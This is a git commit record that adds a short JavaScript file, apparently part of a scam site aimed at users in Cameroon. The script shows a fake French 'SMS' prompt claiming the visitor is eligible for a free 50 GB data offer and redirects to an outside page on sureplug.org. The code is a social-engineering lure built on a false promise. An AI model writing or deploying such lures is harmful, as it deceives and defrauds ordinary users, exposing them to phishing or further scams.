27eba4a4136fa84f0f0b4c4cfb413e483acf9fa1
surepluger <adigunkola666@gmail.com>
2025-05-08 07:03:33 +0100

    Create cameroon-active.js

---
+++ cameroon-active.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVER 50 Go'
+password=prompt('SMS: Félicitations, vous êtes éligible pour recevoir une offre de 50 Go, appuyez sur OK pour activer maintenant ','ACTIVER 50 Go');
+if (password != 'ACTIVER 50 Go') {
+location.href='https://sureplug.org/cameroon.html';
+}
